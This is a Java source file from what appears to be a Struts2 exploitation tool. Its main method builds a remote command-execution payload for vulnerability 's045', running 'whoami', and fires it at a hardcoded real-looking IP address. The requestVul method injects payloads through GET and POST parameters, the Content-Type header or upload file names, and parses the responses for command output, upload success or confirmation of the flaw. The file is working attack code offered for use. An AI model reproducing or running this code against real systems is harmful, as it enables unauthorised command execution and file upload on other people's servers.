package fx.com.Check;

import fx.com.Payload.Spayload;
import fx.com.Utils.RandomUtils;
import cn.hutool.http.HttpRequest;


import java.util.Map;


public class checkVul {
    public static void main(String[] args) {

        Map<String, String> a = Spayload.builder()
                .selectModelAndVul("exec", "s045")
                .selectExec("whoami")
//                .selectUpload("C:\\Users\\Administrator\\Desktop\\xx.txt", "xxxxx", "")
                .VulInfo();
        for (String key : a.keySet()) {
            String value = a.get(key);
            System.out.println(key + " = " + value);
        }

        String res = requestVul("http://42.192.45.94:8080", a, "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36", "", "");
        System.out.println(res);
    }

    public static String requestVul(String target, Object... optional) {
        String resp;
        Map<String, String> vulInfo = (Map<String, String>) optional[0];

        String ua = (String) optional[1];
        String cookie = (String) optional[2];
        String proxy = (String) optional[3];
        String payloadStr = vulInfo.get("payload");
        String payload_get;
        String payload_post;

        HttpRequest req = null;
        switch (vulInfo.get("method")) {
            case "POST":
                if (payloadStr.contains("|")) {
                    payload_get = "?" + payloadStr.split("\\|")[0];
                    payload_post = payloadStr.split("\\|")[1];
                    req = HttpRequest.post(target + payload_get).timeout(15000).body(payload_post).setConnectionTimeout(15000);
                } else {
                    payload_post = payloadStr;
                    req = HttpRequest.post(target).timeout(15000).body(payload_post).setConnectionTimeout(15000);
                }
                break;
            case "GET":
                if (!target.endsWith("/")) {
                    target = target + "/";
                }
                if (vulInfo.get("type").toLowerCase().contains("upload")) {
                    payload_get = payloadStr.split("\\|")[0];
                    payload_post = payloadStr.split("\\|")[1];
                    req = HttpRequest.post(target + payload_get).timeout(15000).body(payload_post).setConnectionTimeout(15000);
                } else {
                    req = HttpRequest.get(target + vulInfo.get("payload")).timeout(15000);
                }
                break;
            case "Content":
                if (payloadStr.contains("|")) {
                    payload_get = "?" + payloadStr.split("\\|")[0];
                    payload_post = payloadStr.split("\\|")[1];
                    req = HttpRequest.post(target + payload_get).timeout(15000).header("Content-Type", payload_post);
                } else {
                    payload_post = payloadStr;
                    req = HttpRequest.post(target).timeout(15000).header("Content-Type", payload_post);
                }
                break;
            case "FileName":
                byte[] xx = "".getBytes();
                if (payloadStr.contains("|")) {
                    payload_get = "?" + payloadStr.split("\\|")[0];
                    payload_post = payloadStr.split("\\|")[1];
                    req = HttpRequest.post(target + payload_get).timeout(15000).form("x", xx, payload_post);
                } else {
                    payload_post = payloadStr;
                    req = HttpRequest.post(target).timeout(15000).form("x", xx, payload_post);
                }
                break;
        }
        if (optional.length == 4 && !optional[3].equals("")) {
            System.out.println("1");
            String proxyhost = proxy.split(":")[0];
            int port = Integer.parseInt(proxy.split(":")[1]);
            resp = req.header("User-Agent", ua)
                    .header("Connection", "close")
                    .cookie(cookie)
                    .setHttpProxy(proxyhost, port)
                    .execute()
                    .httpVersion("HTTP/1.0")
                    .toString();
        } else if (optional.length == 4 && !optional[2].equals("")) {
            System.out.println("2");
            resp = req.header("User-Agent", ua)
                    .header("Connection", "close")
                    .cookie(cookie)
                    .execute()
                    .httpVersion("HTTP/1.0")
                    .toString();
        } else {
            System.out.println("3");
            resp = req.header("User-Agent", ua)
                    .header("Connection", "close")
                    .execute()
                    .httpVersion("HTTP/1.0")
                    .toString();
        }
//        System.out.println(HtmlUtil.removeHtmlTag(resp, "html"));
//        System.out.println(vulInfo.size());
//        System.out.println(resp);
        if (vulInfo.get("res") != null) {
            if (resp.contains("UPLOAD-OK")) {
                System.out.println(vulInfo.get("info") + target + " 上传成功!\n");
                return "上传成功!";
            } else if (resp.contains(vulInfo.get("res"))) {
//                System.out.println(vulInfo.get(3) + target + " 存在漏洞!");
//                System.out.println(resp);
                return vulInfo.get("info") + target + " 存在漏洞!\n";
            }
        }

        if (vulInfo.get("type").toLowerCase().contains("exec")) {
//            System.out.println(resp);
            String str1 = resp.substring(0, resp.indexOf("Body:"));
            String str2 = resp.substring(str1.length() + 5, resp.length());
            return "[+] 执行的命令:" + vulInfo.get("command") + '\n' + str2 + "\n";
        }
        if (vulInfo.get("type").toLowerCase().contains("path")) {
            String str1 = resp.substring(0, resp.indexOf("Body:"));
            String str2 = resp.substring(str1.length() + 5, resp.length());
            return RandomUtils.replaceBlank(str2) + "\n";
        }
        return "";
//        return HtmlUtil.removeHtmlTag(resp, "html");
    }


}
